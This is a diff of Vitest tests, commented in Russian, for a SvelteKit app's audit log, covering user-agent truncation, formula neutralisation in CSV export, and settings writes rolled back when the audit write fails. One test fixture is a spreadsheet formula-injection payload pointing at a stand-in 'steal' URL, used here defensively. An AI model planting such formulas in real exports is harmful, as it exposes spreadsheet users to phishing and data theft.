@@ -2,17 +2,44 @@ import type { RequestEvent } from '@sveltejs/kit';
 import { eq } from 'drizzle-orm';
 import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
 import type { AuditEventType, AuditOutcome, AuditSource } from '$lib/contracts/audit';
+import type { ActorContext } from '$lib/server/actor';
 import type { SessionUser } from '$lib/server/auth/types';
 import { listApiKeys } from '$lib/server/api/keys';
+import { recordAuditEvent } from '$lib/server/audit';
 import { createUser } from '$lib/server/auth/users';
 import { loadSessionUser } from '$lib/server/auth/session';
 import { auditEvents, users } from '$lib/server/db/schema';
 import { getRedis } from '$lib/server/redis';
+import { getSetting, setSetting, SETTING_DEFAULTS } from '$lib/server/settings';
 import { startTestDatabase, testActor, TEST_USER_IDS, type TestDatabase } from '../helpers/db';
 import { pageEvent, sessionUser } from '../helpers/event';
 
 // См. комментарий в `helpers/db.ts`: без этого сервисы пойдут в базу разработчика.
 vi.mock('$env/dynamic/private', () => ({ env: process.env }));
+
+/**
+ * Сбой записи в журнал на заказ. Настройка и событие о ней обязаны быть одной
+ * транзакцией, и другого способа это проверить нет: журнал роняют не данные, а
+ * недоступная база, которой в тесте взяться неоткуда.
+ */
+const journal = vi.hoisted(() => ({ failOn: null as AuditEventType | null }));
+
+vi.mock('$lib/server/audit', async (importOriginal) => {
+	const actual = await importOriginal<typeof import('$lib/server/audit')>();
+
+	return {
+		...actual,
+		recordAuditEvent: async (
+			...args: Parameters<typeof actual.recordAuditEvent>
+		): Promise<void> => {
+			if (args[1].type === journal.failOn) {
+				throw new Error('журнал недоступен');
+			}
+
+			return actual.recordAuditEvent(...args);
+		}
+	};
+});
 
 /**
  * `DEMO_MODE` разбирается один раз за процесс, поэтому переменная окружения тут
@@ -76,6 +103,7 @@ afterAll(async () => {
 beforeEach(async () => {
 	await database.reset();
 	demo.mode = false;
+	journal.failOn = null;
 });
 
 /**
@@ -327,6 +355,100 @@ describe('выгрузка журнала', () => {
 			.where(eq(auditEvents.eventType, 'audit.exported'));
 
 		expect(denied).toEqual([{ outcome: 'denied', actorUserId: TEST_USER_IDS.manager }]);
+	});
+});
+
+describe('гигиена журнала', () => {
+	/** Контекст с подложенной строкой клиента: её задаёт тот, кто обращается. */
+	function withUserAgent(userAgent: string): ActorContext {
+		return { ...testActor(), userAgent };
+	}
+
+	it('обрезает строку клиента до потолка', async () => {
+		await recordAuditEvent(withUserAgent('A'.repeat(8 * 1024)), {
+			type: 'auth.login',
+			outcome: 'success'
+		});
+
+		const [row] = await database.db
+			.select({ userAgent: auditEvents.userAgent })
+			.from(auditEvents)
+			.where(eq(auditEvents.eventType, 'auth.login'));
+
+		// Заголовок `User-Agent` не проверяет никто: без потолка каждая запись
+		// журнала уносила бы в базу столько, сколько влезло в запрос.
+		expect(Buffer.byteLength(row.userAgent ?? '', 'utf8')).toBe(512);
+	});
+
+	it('режет по границе символа, а не байта', async () => {
+		// 512 байт — это 256 кириллических букв: срез посреди буквы положил бы в
+		// журнал «замену» вместо символа.
+		await recordAuditEvent(withUserAgent('Я'.repeat(400)), {
+			type: 'auth.login',
+			outcome: 'success'
+		});
+
+		const [row] = await database.db
+			.select({ userAgent: auditEvents.userAgent })
+			.from(auditEvents)
+			.where(eq(auditEvents.eventType, 'auth.login'));
+
+		expect(row.userAgent).toBe('Я'.repeat(256));
+	});
+
+	it('обезвреживает формулу в ячейке выгрузки', async () => {
+		const formula = '=HYPERLINK("http://example.invalid/steal","Открыть")';
+
+		await insertEvent({
+			type: 'auth.login',
+			occurredAt: moscow('2026-09-10T10:00:00'),
+			userAgent: formula
+		});
+
+		const response = await exportAudit(pageEvent({ path: '/audit/export', query: '?format=csv' }));
+		const lines = (await response.text()).split('\r\n');
+		const line = lines.find((row) => row.includes('HYPERLINK'));
+
+		if (line === undefined) {
+			throw new Error('строка со строкой клиента не попала в выгрузку');
+		}
+
+		// Кавычки вокруг ячейки формулу не обезвреживают: таблица разбирает
+		// содержимое уже после них. Обезвреживает апостроф в начале значения.
+		const userAgentColumn = 9;
+		expect(line.split(';')[userAgentColumn]).toBe(`"'${formula.replaceAll('"', '""')}"`);
+	});
+});
+
+describe('запись настройки', () => {
+	it('не остаётся в базе, если её не удалось записать в журнал', async () => {
+		journal.failOn = 'settings.updated';
+
+		await expect(setSetting(testActor(), 'session_idle_minutes', 45)).rejects.toThrow(
+			'журнал недоступен'
+		);
+
+		// Настройка безопасности, поменянная без следа в журнале, ничем не
+		// отличается от подменённой: значение обязано остаться прежним.
+		await expect(getSetting('session_idle_minutes')).resolves.toBe(
+			SETTING_DEFAULTS.session_idle_minutes
+		);
+	});
+
+	it('оставляет след отказа, когда права на неё нет', async () => {
+		await expect(
+			setSetting(testActor({ roleId: 'manager' }), 'session_idle_minutes', 45)
+		).rejects.toMatchObject({ code: 'forbidden' });
+
+		const denied = await database.db
+			.select({ outcome: auditEvents.outcome, actorUserId: auditEvents.actorUserId })
+			.from(auditEvents)
+			.where(eq(auditEvents.eventType, 'settings.updated'));
+
+		expect(denied).toEqual([{ outcome: 'denied', actorUserId: TEST_USER_IDS.manager }]);
+		await expect(getSetting('session_idle_minutes')).resolves.toBe(
+			SETTING_DEFAULTS.session_idle_minutes
+		);
 	});
 });
 
